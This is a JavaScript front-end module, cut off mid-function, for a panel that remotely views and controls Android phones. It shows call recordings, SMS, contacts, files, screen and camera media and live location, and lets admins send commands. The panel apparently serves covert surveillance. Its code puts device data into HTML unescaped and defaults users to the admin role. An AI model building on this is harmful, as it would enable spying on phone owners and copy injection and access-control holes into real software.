// DeviceDetailPanel: renders a full device panel with actions mapped to API endpoints

// ------------------------------------------------------------
// SSE Auto-Reconnect Helper
// ------------------------------------------------------------
class SSEConnection {
  constructor(url, onMessage, onError = null) {
    this.url = url;
    this.onMessage = onMessage;
    this.onError = onError;

    this.es = null;
    this.reconnectDelay = 1000; // start with 1s
    this.maxDelay = 30000; // max 30s
    this.shouldReconnect = true;

    this.connect();
  }

  connect() {
    this.es = new EventSource(this.url);

    this.es.onopen = () => {
      console.log("[SSE] Connected:", this.url);
      this.reconnectDelay = 1000; // reset backoff
    };

    this.es.onmessage = (ev) => {
      if (this.onMessage) this.onMessage(ev);
    };

    this.es.onerror = (err) => {
      console.warn("[SSE] Error, reconnecting soon…", err);
      if (this.onError) this.onError(err);

      this.es.close();
      this.scheduleReconnect();
    };
  }

  scheduleReconnect() {
    if (!this.shouldReconnect) return;

    console.log(`[SSE] Reconnecting in ${this.reconnectDelay / 1000}s...`);

    setTimeout(() => {
      this.reconnectDelay = Math.min(this.reconnectDelay * 2, this.maxDelay);
      this.connect();
    }, this.reconnectDelay);
  }

  close() {
    this.shouldReconnect = false;
    if (this.es) this.es.close();
  }
}

export default class DeviceDetailPanel {
  constructor({ api, ui, ws }) {
    this.api = api;
    this.ui = ui;
    this.ws = ws;

    this.container = document.getElementById("device-detail-host");
    this.current = null;

    this.map = null;
    this.mapMarker = null;
    this.mapTrail = null;

    this.liveStream = null;

    this.currentPath = "/storage/emulated/0"; // root for file explorer
    this.contactsCache = [];

    this.applySavedTheme();
  }

  // -------- Role / theme helpers ---------------------------------

  get currentRole() {
    // Try different globals; fallback to ADMIN for backward compatibility
    if (window.currentUser && window.currentUser.role) return window.currentUser.role;
    if (window.currentUserRole) return window.currentUserRole;
    return "ADMIN";
  }

  get isAdmin() {
    return this.currentRole === "ADMIN";
  }

  applySavedTheme() {
    try {
      const theme = localStorage.getItem("admin-theme");
      if (theme === "dark") document.body.classList.add("dark-theme");
    } catch (_) {}
  }

  initThemeToggle() {
    const btn = document.getElementById("btn-toggle-theme");
    if (!btn) return;

    const syncLabel = () => {
      const isDark = document.body.classList.contains("dark-theme");
      btn.textContent = isDark ? "☀ Light" : "🌙 Dark";
    };

    syncLabel();

    btn.addEventListener("click", () => {
      document.body.classList.toggle("dark-theme");
      const isDark = document.body.classList.contains("dark-theme");
      try {
        localStorage.setItem("admin-theme", isDark ? "dark" : "light");
      } catch (_) {}
      syncLabel();
    });
  }

  // -------- Generic paginator helper ------------------------------

  createPaginator(idPrefix, onPageChange, defaultPage = 1, defaultLimit = 25) {
    const wrapper = document.createElement("div");
    wrapper.className = "d-flex flex-wrap align-items-center gap-2 mb-2";

    const prev = document.createElement("button");
    prev.className = "btn btn-sm btn-outline-secondary";
    prev.textContent = "Prev";
    prev.disabled = true;

    const next = document.createElement("button");
    next.className = "btn btn-sm btn-outline-secondary";
    next.textContent = "Next";

    const pageInfo = document.createElement("div");
    pageInfo.id = `${idPrefix}-page-info`;
    pageInfo.textContent = `Page ${defaultPage}`;

    const limitSelect = document.createElement("select");
    limitSelect.className = "form-select form-select-sm";
    [10, 25, 50, 100, 200, 500].forEach((n) => {
      const opt = document.createElement("option");
      opt.value = n;
      opt.text = `${n}/page`;
      if (n === defaultLimit) opt.selected = true;
      limitSelect.appendChild(opt);
    });

    wrapper.appendChild(prev);
    wrapper.appendChild(pageInfo);
    wrapper.appendChild(next);
    wrapper.appendChild(limitSelect);

    let page = defaultPage;
    let limit = defaultLimit;

    prev.addEventListener("click", async () => {
      if (page > 1) {
        page--;
        const meta = await onPageChange(page, limit);
        pageInfo.textContent = `Page ${page}`;
        prev.disabled = page === 1;
        next.disabled = !meta.hasMore;
      }
    });

    next.addEventListener("click", async () => {
      page++;
      const meta = await onPageChange(page, limit);
      pageInfo.textContent = `Page ${page}`;
      prev.disabled = page === 1;
      next.disabled = !meta.hasMore;
    });

    limitSelect.addEventListener("change", async () => {
      limit = parseInt(limitSelect.value, 10);
      page = 1;
      const meta = await onPageChange(page, limit);
      pageInfo.textContent = `Page ${page}`;
      prev.disabled = true;
      next.disabled = !meta.hasMore;
    });

    return {
      wrapper,
      init: async () => {
        const meta = await onPageChange(page, limit);
        prev.disabled = true;
        next.disabled = !meta.hasMore;
      },
    };
  }

  // ------------------------------------------------------------
  // Main render
  // ------------------------------------------------------------
  async renderFor(device) {
    if (!device) {
      this.container.innerHTML = `
        <div class="card">
          <div class="card-body">
            <p class="text-muted">Select a device to view details.</p>
          </div>
        </div>`;
      return;
    }

    this.current = device;
    const isAdmin = this.isAdmin;

    this.container.innerHTML = `
      <div class="card h-100">
        <div class="card-body d-flex flex-column">
          <div class="d-flex flex-wrap justify-content-between align-items-center mb-3 gap-2">
            <div>
              <h4 class="mb-0">${device.name || device.deviceId || device.device_name || device.device_id}</h4>
              <small class="text-muted">Role: ${this.currentRole}</small>
            </div>
            <div class="d-flex flex-wrap gap-2">
              <button id="btn-toggle-theme" class="btn btn-sm btn-outline-secondary">🌙 Dark</button>
              <button id="btn-refresh-device" class="btn btn-sm btn-outline-secondary">Refresh</button>
              <button id="btn-reload-device" class="btn btn-sm btn-primary">Reload</button>
            </div>
          </div>

          <ul class="nav nav-tabs mb-3" id="device-tabs" role="tablist">
            <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#tab-overview">Overview</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-accessibility">Accessibility</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-apps">Installed Apps</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-applogs">App Logs</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-updates">App Updates</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-calllogs">Call Logs</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-recordings">Call Recordings</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-contacts">Contacts</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-files">File Explorer</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-location">Location</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-media">Camera / Media</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-screen">Screen</a></li>
            <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-sms">SMS</a></li>
            ${
              isAdmin
                ? `<li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#tab-commands">Commands</a></li>`
                : ""
            }
          </ul>

          <div class="tab-content flex-grow-1 overflow-auto">
            <div class="tab-pane fade show active" id="tab-overview">
              <div id="device-overview"></div>
            </div>

            <div class="tab-pane fade" id="tab-accessibility"><div id="device-accessibility"></div></div>
            <div class="tab-pane fade" id="tab-apps"><div id="device-apps"></div></div>
            <div class="tab-pane fade" id="tab-applogs"><div id="device-applogs"></div></div>
            <div class="tab-pane fade" id="tab-updates"><div id="device-updates"></div></div>
            <div class="tab-pane fade" id="tab-calllogs"><div id="device-calllogs"></div></div>
            <div class="tab-pane fade" id="tab-recordings"><div id="device-recordings"></div></div>
            <div class="tab-pane fade" id="tab-contacts"><div id="device-contacts"></div></div>
            <div class="tab-pane fade" id="tab-files"><div id="device-files"></div></div>
            <div class="tab-pane fade" id="tab-location">
              <div id="device-location" style="height:420px"></div>
              <div id="device-location-controls" class="mt-2"></div>
            </div>
            <div class="tab-pane fade" id="tab-media">
              <div id="device-media-list"></div>
            </div>
            <div class="tab-pane fade" id="tab-screen">
              <div id="device-screen-list"></div>
            </div>
            <div class="tab-pane fade" id="tab-sms"><div id="device-sms"></div></div>
            ${
              isAdmin
                ? `<div class="tab-pane fade" id="tab-commands"><div id="device-commands"></div></div>`
                : ""
            }
          </div>
        </div>
      </div>
    `;

    document
      .getElementById("btn-refresh-device")
      ?.addEventListener("click", () => this.refresh());
    document
      .getElementById("btn-reload-device")
      ?.addEventListener("click", () => this.refresh());

    this.initThemeToggle();

    // initial load for all tabs
    this.renderOverview();
    this.loadAccessibility();
    this.loadInstalledApps();
    this.loadAppLogs();
    this.loadAppUpdates();
    this.loadCallLogs();
    this.loadCallRecordings();
    this.loadContacts();
    this.loadFileExplorer();
    this.loadLocation();
    this.loadMediaList();
    this.loadScreenList();
    this.loadSMS();
    if (isAdmin) this.loadCommandsHistory();
  }

  // ------------------------------------------------------------
  // Overview
  // ------------------------------------------------------------
  async renderOverview() {
    const d = this.current;
    const host = document.getElementById("device-overview");

    host.innerHTML = `
      <div class="row g-3">
        <div class="col-md-4 col-12">
          <div class="card p-2 h-100">
            <h6>Device Info</h6>
            <pre class="small mb-0">${JSON.stringify(d.deviceInfo || d, null, 2)}</pre>
          </div>
        </div>

        <div class="col-md-4 col-12">
          <div class="card p-2 h-100">
            <h6>Status</h6>
            <div>Last seen: ${
              d.last_seen || d.lastSeen
                ? new Date(d.last_seen || d.lastSeen).toLocaleString()
                : "Never"
            }</div>
            <div>Online: ${
              d.status ? (d.status === "online" ? "Yes" : "No") : d.isOnline ? "Yes" : "No"
            }</div>
          </div>
        </div>

        <div class="col-md-4 col-12">
          <div class="card p-2 h-100">
            <h6>Actions</h6>
            <div class="d-grid gap-2">
              <button id="overview-get-info" class="btn btn-sm btn-outline-primary">Get device info</button>
              <button id="overview-push-config" class="btn btn-sm btn-outline-secondary">Push config</button>
              ${
                this.isAdmin
                  ? `<button id="overview-reboot" class="btn btn-sm btn-outline-danger">Set offline</button>`
                  : ""
              }
            </div>
          </div>
        </div>
      </div>
    `;

    document
      .getElementById("overview-get-info")
      ?.addEventListener("click", () => this.sendCommand("get_info"));
    document
      .getElementById("overview-push-config")
      ?.addEventListener("click", () => this.sendCommand("push_config"));
    if (this.isAdmin) {
      document
        .getElementById("overview-reboot")
        ?.addEventListener("click", () => this.setOffline());
    }
  }

  // ------------------------------------------------------------
  // Accessibility
  // ------------------------------------------------------------
  async loadAccessibility() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const resp = await this.api.get(`/devices/${deviceId}/accessibility`);
      document.getElementById("device-accessibility").innerHTML = `<pre>${JSON.stringify(
        resp.data || resp,
        null,
        2
      )}</pre>`;
    } catch (err) {
      console.warn("accessibility load failed", err);
      document.getElementById("device-accessibility").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Installed Apps (paginated)
  // ------------------------------------------------------------
  async loadInstalledApps() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const host = document.getElementById("device-apps");
      host.innerHTML = "";

      const renderPage = async (page, limit) => {
        const resp = await this.api.get(
          `/devices/${deviceId}/apps?page=${page}&limit=${limit}`
        );
        const apps = resp.data?.items || resp.data || [];
        const total = resp.data?.total || apps.length;

        host.querySelector(".apps-list")?.remove();

        const table = document.createElement("table");
        table.className = "table table-sm apps-list table-hover";

        table.innerHTML = `
          <thead>
            <tr><th>Package</th><th>Name</th><th>Version</th><th></th></tr>
          </thead>
          <tbody>
            ${apps
              .map(
                (a) => `
              <tr>
                <td>${a.packageName || a.pkg}</td>
                <td>${a.appName || a.name}</td>
                <td>${a.version || ""}</td>
                <td>
                  ${
                    this.isAdmin
                      ? `<button data-pkg="${a.packageName || a.pkg}"
                          class="btn btn-sm btn-outline-danger btn-uninstall">Uninstall</button>`
                      : ""
                  }
                </td>
              </tr>
            `
              )
              .join("")}
          </tbody>
        `;

        host.appendChild(table);

        if (this.isAdmin) {
          table.querySelectorAll(".btn-uninstall").forEach((btn) => {
            btn.onclick = () =>
              this.sendCommand("uninstall_app", { package: btn.dataset.pkg });
          });
        }

        return { hasMore: page * limit < total };
      };

      const paginator = this.createPaginator("apps", renderPage, 1, 50);
      host.appendChild(paginator.wrapper);
      await paginator.init();
    } catch (err) {
      console.warn("loadInstalledApps failed", err);
      document.getElementById("device-apps").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // App Logs (paginated)
  // ------------------------------------------------------------
  async loadAppLogs() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const host = document.getElementById("device-applogs");
      host.innerHTML = "";

      const renderPage = async (page, limit) => {
        const resp = await this.api.get(
          `/devices/${deviceId}/applogs?page=${page}&limit=${limit}`
        );
        const logs = resp.data?.items || resp.data || [];
        const total = resp.data?.total || logs.length;

        host.querySelector(".applogs-list")?.remove();

        const box = document.createElement("pre");
        box.className = "applogs-list";
        box.style = "max-height:360px;overflow:auto";
        box.textContent = logs.map((l) => JSON.stringify(l)).join("\n");

        host.appendChild(box);

        return { hasMore: page * limit < total };
      };

      const paginator = this.createPaginator("applogs", renderPage, 1, 200);
      host.appendChild(paginator.wrapper);
      await paginator.init();
    } catch (err) {
      console.warn("loadAppLogs failed", err);
      document.getElementById("device-applogs").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // App Updates
  // ------------------------------------------------------------
  async loadAppUpdates() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const resp = await this.api.get(`/devices/${deviceId}/app-updates`);
      const updates = resp.data || resp;

      document.getElementById("device-updates").innerHTML = `<ul>${(updates || [])
        .map((u) => `<li>${u.package} — ${u.type || "available"}</li>`)
        .join("")}</ul>`;
    } catch (err) {
      console.warn("loadAppUpdates failed", err);
      document.getElementById("device-updates").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Call Logs (paginated)
  // ------------------------------------------------------------
  async loadCallLogs() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const host = document.getElementById("device-calllogs");
      host.innerHTML = "";

      const renderPage = async (page, limit) => {
        const resp = await this.api.get(
          `/devices/${deviceId}/call-logs?page=${page}&limit=${limit}`
        );
        const logs = resp.data?.items || resp.data || [];
        const total = resp.data?.total || logs.length;

        host.querySelector(".calllogs-list")?.remove();

        const table = document.createElement("table");
        table.className = "table table-sm calllogs-list table-hover";

        table.innerHTML = `
          <thead>
            <tr><th>Number</th><th>Type</th><th>Time</th><th>Duration</th></tr>
          </thead>
          <tbody>
            ${logs
              .map(
                (c) => `
              <tr>
                <td>${c.number}</td>
                <td>${c.type}</td>
                <td>${new Date(c.timestamp).toLocaleString()}</td>
                <td>${c.duration || ""}</td>
              </tr>
            `
              )
              .join("")}
          </tbody>
        `;

        host.appendChild(table);

        return { hasMore: page * limit < total };
      };

      const paginator = this.createPaginator("calllogs", renderPage, 1, 100);
      host.appendChild(paginator.wrapper);
      await paginator.init();
    } catch (err) {
      console.warn("loadCallLogs failed", err);
      document.getElementById("device-calllogs").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Call Recordings (paginated)
  // ------------------------------------------------------------
  async loadCallRecordings() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const host = document.getElementById("device-recordings");
      host.innerHTML = "";

      const renderPage = async (page, limit) => {
        const resp = await this.api.get(
          `/devices/${deviceId}/call-recordings?page=${page}&limit=${limit}`
        );
        const recs = resp.data?.items || resp.data || [];
        const total = resp.data?.total || recs.length;

        host.querySelector(".recordings-list")?.remove();

        const table = document.createElement("table");
        table.className = "table table-sm recordings-list table-hover";

        table.innerHTML = `
          <thead>
            <tr><th>Name</th><th>When</th><th>Size</th><th></th></tr>
          </thead>
          <tbody>
            ${recs
              .map(
                (r) => `
              <tr>
                <td>${r.filename || r.name}</td>
                <td>${new Date(r.createdAt || r.timestamp).toLocaleString()}</td>
                <td>${r.size || ""}</td>
                <td>
                  <button class="btn btn-sm btn-primary btn-play"
                    data-url="/uploads/call-recordings/${r.filename}">
                    Play
                  </button>
                  ${
                    this.isAdmin
                      ? `
                        <a class="btn btn-sm btn-outline-secondary"
                          href="/api/call-recordings/${r.id}/download">Download</a>
                        <button class="btn btn-sm btn-danger btn-delete"
                          data-id="${r.id}">
                          Delete
                        </button>
                      `
                      : ""
                  }
                </td>
              </tr>
            `
              )
              .join("")}
          </tbody>
        `;

        host.appendChild(table);

        table.querySelectorAll(".btn-play").forEach((btn) => {
          btn.onclick = () => this.playMedia(btn.dataset.url);
        });

        if (this.isAdmin) {
          table.querySelectorAll(".btn-delete").forEach((btn) => {
            btn.onclick = async () => {
              if (!confirm("Delete recording?")) return;
              await this.api.del(`/call-recordings/${btn.dataset.id}`);
              await renderPage(page, limit);
            };
          });
        }

        return { hasMore: page * limit < total };
      };

      const paginator = this.createPaginator("recordings", renderPage, 1, 50);
      host.appendChild(paginator.wrapper);
      await paginator.init();
    } catch (err) {
      console.warn("loadCallRecordings failed", err);
      document.getElementById("device-recordings").textContent = "Not available";
    }
  }

  // ------------------------------------------------------------
  // Play audio in new window
  // ------------------------------------------------------------
  playMedia(url) {
    const w = window.open("", "_blank");
    w.document.write(`<audio controls autoplay src="${url}"></audio>`);
  }

  // ------------------------------------------------------------
  // Contacts (search, save, download, extra fields)
// ------------------------------------------------------------
  async loadContacts() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const host = document.getElementById("device-contacts");
      host.innerHTML = `
        <div class="d-flex flex-wrap justify-content-between mb-2 gap-2">
          <div class="input-group input-group-sm" style="max-width: 320px;">
            <span class="input-group-text">Search</span>
            <input id="contacts-search" type="text" class="form-control" placeholder="Name, phone, email, notes...">
          </div>
          <div class="d-flex gap-2">
            <button id="contacts-download-csv" class="btn btn-sm btn-outline-secondary">Download CSV</button>
            <button id="contacts-download-vcf" class="btn btn-sm btn-outline-secondary">Download vCard</button>
            ${
              this.isAdmin
                ? `<button id="contacts-add" class="btn btn-sm btn-primary">Add Contact</button>`
                : ""
            }
          </div>
        </div>
        <div class="table-responsive">
          <table class="table table-sm table-hover" id="contacts-table">
            <thead>
              <tr>
                <th>Name</th>
                <th>Phones</th>
                <th>Emails</th>
                <th>Org</th>
                <th>Notes</th>
                <th>Events</th>
                <th></th>
              </tr>
            </thead>
            <tbody></tbody>
          </table>
        </div>
      `;

      const resp = await this.api.get(`/devices/${deviceId}/contacts`);
      this.contactsCache = resp.data || resp || [];

      const tbody = host.querySelector("#contacts-table tbody");

      const renderRows = (list) => {
        tbody.innerHTML = (list || [])
          .map((c) => {
            const phones = (c.phones || c.numbers || [c.number])
              .filter(Boolean)
              .join(", ");
            const emails = (c.emails || [c.email]).filter(Boolean).join(", ");
            const notes = c.notes || c.note || "";
            const org = c.organization || c.company || "";
            const eventsArr = c.events || [];
            const events = eventsArr
              .map((e) => `${e.type || ""}: ${e.date || ""}`)
              .join("; ");

            return `
              <tr data-id="${c.id}">
                <td>${c.name || ""}</td>
                <td>${phones}</td>
                <td>${emails}</td>
                <td>${org}</td>
                <td>${notes}</td>
                <td>${events}</td>
                <td class="text-nowrap">
                  ${
                    this.isAdmin
                      ? `
                        <button class="btn btn-sm btn-outline-primary btn-edit-contact">Edit</button>
                        <button class="btn btn-sm btn-outline-danger btn-del-contact">Delete</button>
                      `
                      : ""
                  }
                </td>
              </tr>
            `;
          })
          .join("");
      };

      renderRows(this.contactsCache);

      // search
      host.querySelector("#contacts-search").addEventListener("input", (e) => {
        const q = e.target.value.toLowerCase();
        const filtered = this.contactsCache.filter((c) => {
          const text =
            [
              c.name,
              c.number,
              ...(c.phones || c.numbers || []),
              ...(c.emails || [c.email]),
              c.notes,
              c.organization,
            ]
              .filter(Boolean)
              .join(" ")
              .toLowerCase();
          return text.includes(q);
        });
        renderRows(filtered);
      });

      // download CSV
      host.querySelector("#contacts-download-csv").onclick = () => {
        window.open(
          `/api/devices/${deviceId}/contacts/export?format=csv`,
          "_blank"
        );
      };

      // download vCard
      host.querySelector("#contacts-download-vcf").onclick = () => {
        window.open(
          `/api/devices/${deviceId}/contacts/export?format=vcf`,
          "_blank"
        );
      };

      if (this.isAdmin) {
        // add contact
        host.querySelector("#contacts-add").onclick = () =>
          this.openContactEditor(deviceId, null);

        // edit/delete
        host
          .querySelector("#contacts-table")
          .addEventListener("click", (ev) => {
            const row = ev.target.closest("tr[data-id]");
            if (!row) return;
            const id = row.dataset.id;
            const contact = this.contactsCache.find((c) => String(c.id) === String(id));
            if (!contact) return;

            if (ev.target.classList.contains("btn-edit-contact")) {
              this.openContactEditor(deviceId, contact);
            } else if (ev.target.classList.contains("btn-del-contact")) {
              this.deleteContact(deviceId, id);
            }
          });
      }
    } catch (err) {
      console.warn("loadContacts failed", err);
      document.getElementById("device-contacts").textContent = "Not available";
    }
  }

  async openContactEditor(deviceId, contact) {
    const isNew = !contact;
    const title = isNew ? "Add Contact" : "Edit Contact";

    const name = contact?.name || "";
    const phone = (contact?.phones || contact?.numbers || [contact?.number || ""])[0] || "";
    const email = (contact?.emails || [contact?.email || ""])[0] || "";
    const org = contact?.organization || contact?.company || "";
    const notes = contact?.notes || contact?.note || "";

    const html = `
      <form id="contact-form" class="vstack gap-2">
        <div class="form-group">
          <label class="form-label">Name</label>
          <input name="name" class="form-control form-control-sm" value="${name}">
        </div>
        <div class="form-group">
          <label class="form-label">Phone</label>
          <input name="phone" class="form-control form-control-sm" value="${phone}">
        </div>
        <div class="form-group">
          <label class="form-label">Email</label>
          <input name="email" class="form-control form-control-sm" value="${email}">
        </div>
        <div class="form-group">
          <label class="form-label">Organization</label>
          <input name="org" class="form-control form-control-sm" value="${org}">
        </div>
        <div class="form-group">
          <label class="form-label">Notes</label>
          <textarea name="notes" class="form-control form-control-sm" rows="2">${notes}</textarea>
        </div>
      </form>
    `;

    this.ui.showModal(title, html, {
      onShown: () => {},
      onOk: async () => {
        const form = document.getElementById("contact-form");
        const payload = {
          name: form.name.value,
          phones: [form.phone.value],
          emails: [form.email.value],
          organization: form.org.value,
          notes: form.notes.value,
        };

        try {
          if (isNew) {
            await this.api.post(`/devices/${deviceId}/contacts`, payload);
          } else {
            await this.api.put(
              `/devices/${deviceId}/contacts/${contact.id}`,
              payload
            );
          }
          this.ui.showNotification("Contact saved", "success", 2000);
          this.loadContacts();
        } catch (err) {
          console.error("save contact failed", err);
          this.ui.showError("Failed to save contact");
        }
      },
    });
  }

  async deleteContact(deviceId, id) {
    if (!confirm("Delete this contact?")) return;
    try {
      await this.api.del(`/devices/${deviceId}/contacts/${id}`);
      this.ui.showNotification("Contact deleted", "success", 2000);
      this.loadContacts();
    } catch (err) {
      console.error("delete contact failed", err);
      this.ui.showError("Failed to delete contact");
    }
  }

  // ------------------------------------------------------------
  // File Explorer with directories
  // ------------------------------------------------------------
  async loadFileExplorer() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;
      const host = document.getElementById("device-files");
      host.innerHTML = `
        <div class="d-flex flex-wrap justify-content-between align-items-center mb-2 gap-2">
          <div class="breadcrumb mb-0" id="file-breadcrumb"></div>
          <div class="d-flex gap-2">
            ${
              this.isAdmin
                ? `
                  <button id="btn-mkdir" class="btn btn-sm btn-outline-secondary">New Folder</button>
                  <div class="input-group input-group-sm">
                    <input id="upload-file-input" type="file" class="form-control form-control-sm"/>
                    <button id="btn-upload-file" class="btn btn-sm btn-primary">Upload</button>
                  </div>
                `
                : ""
            }
          </div>
        </div>
        <div id="file-list" class="table-responsive"></div>
      `;

      const renderPathBreadcrumb = () => {
        const crumbHost = document.getElementById("file-breadcrumb");
        const parts = this.currentPath.split("/").filter(Boolean);
        let accum = "";
        const items = [
          `<a href="#" data-path="/storage/emulated/0">/storage/emulated/0</a>`,
          ...parts.slice(2).map((p) => {
            accum += "/" + p;
            return `<span class="mx-1">/</span><a href="#" data-path="/storage/emulated/0${accum}">${p}</a>`;
          }),
        ];
        crumbHost.innerHTML = items.join("");
        crumbHost.querySelectorAll("a[data-path]").forEach((a) => {
          a.onclick = (e) => {
            e.preventDefault();
            this.currentPath = a.dataset.path;
            this.refreshFileList(deviceId);
          };
        });
      };

      renderPathBreadcrumb();
      await this.refreshFileList(deviceId);

      if (this.isAdmin) {
        document.getElementById("btn-upload-file").onclick = async () => {
          const input = document.getElementById("upload-file-input");
          const f = input.files[0];
          if (!f) return this.ui.showError("Select file");
          const fd = new FormData();
          fd.append("file", f);
          fd.append("deviceId", deviceId);
          fd.append("path", this.currentPath);
          await fetch("/api/files/upload", {
            method: "POST",
            body: fd,
            headers: {
              Authorization: this.api.token ? `Bearer ${this.api.token}` : "",
            },
          });
          this.refreshFileList(deviceId);
        };

        document.getElementById("btn-mkdir").onclick = async () => {
          const name = prompt("Folder name:");
          if (!name) return;
          try {
            await this.api.post(`/files/mkdir`, {
              deviceId,
              path: this.currentPath,
              name,
            });
            this.refreshFileList(deviceId);
          } catch (err) {
            console.error("mkdir failed", err);
            this.ui.showError("Failed to create folder");
          }
        };
      }
    } catch (err) {
      console.warn("loadFileExplorer failed", err);
      document.getElementById("device-files").textContent = "Not available";
    }
  }

  async refreshFileList(deviceId) {
    const listHost = document.getElementById("file-list");
    if (!listHost) return;

    try {
      const resp = await this.api.get(
        `/devices/${deviceId}/files?path=${encodeURIComponent(this.currentPath)}`
      );
      const entries = resp.data || resp || [];

      const rows = entries
        .map((e) => {
          const isDir = e.type === "directory" || e.type === "dir" || e.isDirectory;
          const icon = isDir ? "📁" : "📄";
          return `
            <tr data-path="${this.currentPath}/${e.name}" data-type="${
            isDir ? "dir" : "file"
          }">
              <td>${icon} ${e.name}</td>
              <td>${e.size || ""}</td>
              <td>${e.modified || ""}</td>
              <td class="text-nowrap">
                ${
                  isDir
                    ? `<button class="btn btn-sm btn-outline-primary btn-open">Open</button>`
                    : `<button class="btn btn-sm btn-outline-secondary btn-download">Download</button>`
                }
                ${
                  this.isAdmin
                    ? `<button class="btn btn-sm btn-outline-danger btn-delete">Delete</button>`
                    : ""
                }
              </td>
            </tr>
          `;
        })
        .join("");

      listHost.innerHTML = `
        <table class="table table-sm table-hover">
          <thead>
            <tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr>
          </thead>
          <tbody>
            ${
              this.currentPath !== "/storage/emulated/0"
                ? `
                  <tr data-up="1">
                    <td>⬆ ..</td><td></td><td></td><td></td>
                  </tr>
                `
                : ""
            }
            ${rows}
          </tbody>
        </table>
      `;

      const tbody = listHost.querySelector("tbody");

      // up one level
      tbody.querySelectorAll("tr[data-up]").forEach((tr) => {
        tr.onclick = () => {
          const parts = this.currentPath.split("/").filter(Boolean);
          if (parts.length <= 3) {
            this.currentPath = "/storage/emulated/0";
          } else {
            this.currentPath = "/" + parts.slice(0, parts.length - 1).join("/");
          }
          const crumbHost = document.getElementById("file-breadcrumb");
          if (crumbHost) {
            // re-render breadcrumb
            const event = new Event("reload-breadcrumb");
            crumbHost.dispatchEvent(event);
          }
          this.refreshFileList(deviceId);
        };
      });

      // open / download / delete
      tbody.querySelectorAll("tr[data-path]").forEach((tr) => {
        const path = tr.dataset.path;
        const type = tr.dataset.type;

        const btnOpen = tr.querySelector(".btn-open");
        const btnDownload = tr.querySelector(".btn-download");
        const btnDelete = tr.querySelector(".btn-delete");

        if (btnOpen) {
          btnOpen.onclick = () => {
            this.currentPath = path;
            this.loadFileExplorer(); // rebuild UI & breadcrumb
          };
        }

        if (btnDownload) {
          btnDownload.onclick = () => {
            window.open(
              `/api/files/download?deviceId=${deviceId}&path=${encodeURIComponent(path)}`,
              "_blank"
            );
          };
        }

        if (btnDelete && this.isAdmin) {
          btnDelete.onclick = async () => {
            if (!confirm("Delete?")) return;
            await this.api.del(
              `/files?deviceId=${deviceId}&path=${encodeURIComponent(path)}`
            );
            this.refreshFileList(deviceId);
          };
        }
      });
    } catch (err) {
      console.error("refreshFileList failed", err);
      listHost.textContent = "Failed to load directory";
    }
  }

  // ------------------------------------------------------------
  // Location (pagination + SSE + CSV export)
  // ------------------------------------------------------------
  async loadLocation() {
    try {
      const deviceId = this.current.deviceId || this.current.device_id || this.current.id;

      const mapHost = document.getElementById("device-location");
      const controls = document.getElementById("device-location-controls");
      controls.innerHTML = "";

      // init map
      if (!this.map && typeof L !== "undefined") {
        this.map = L.map(mapHost).setView([0, 0], 2);
        L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
          maxZoom: 18,
        }).addTo(this.map);
      }

      const renderPage = async (page, limit) => {
        const resp = await this.api.get(
          `/devices/${deviceId}/locations?page=${page}&limit=${limit}`
        );
        const points = resp.data?.items || resp.data || [];
        const total = resp.data?.total || points.length;

        if (this.mapTrail) {
          this.map.removeLayer(this.mapTrail);
          this.mapTrail = null;
        }

        const latlngs = points.map((p) => [p.latitude, p.longitude]);

        if (latlngs.length > 0) {
          this.mapTrail = L.polyline(latlngs, { weight: 3 }).addTo(this.map);
          this.map.fitBounds(this.mapTrail.getBounds());
        }

        return { hasMore: page * limit < total };
      };

      // pagination
      const paginator = this.createPaginator("locations", renderPage, 1, 200);
      controls.appendChild(paginator.wrapper);
      await paginator.init();

      // SSE live stream toggle
      const btnLive = document.createElement("button");
      btnLive.className = "btn btn-sm btn-outline-primary ms-2";
      btnLive.textContent = "Start Live Stream";
      controls.appendChild(btnLive);

      btnLive.onclick = () => {
        if (!this.liveStream) {
          this.liveStream = new SSEConnection(
            `/api/devices/${deviceId}/locations/stream`,
            (ev) => {
              try {
                const p = JSON.parse(ev.data);
                const latlng = [p.latitude, p.longitude];

                if (!this.mapMarker) {
                  this.mapMarker = L.marker(latlng).addTo(this.map);
                } else {
                  this.mapMarker.setLatLng(latlng);
                }

                if (!this.mapTrail) {
                  this.mapTrail = L.polyline([latlng], { weight: 3 }).addTo(this.map);
                } else {
                  const pts = this.mapTrail.getLatLngs();
                  pts.push(latlng);
                  this.mapTrail.setLatLngs(pts);
                }

                this.map.panTo(latlng);
              } catch (err) {
                console.warn("Invalid SSE payload:", err);
              }
            },
            (err) => {
              console.warn("SSE connection lost:", err);
            }
          );

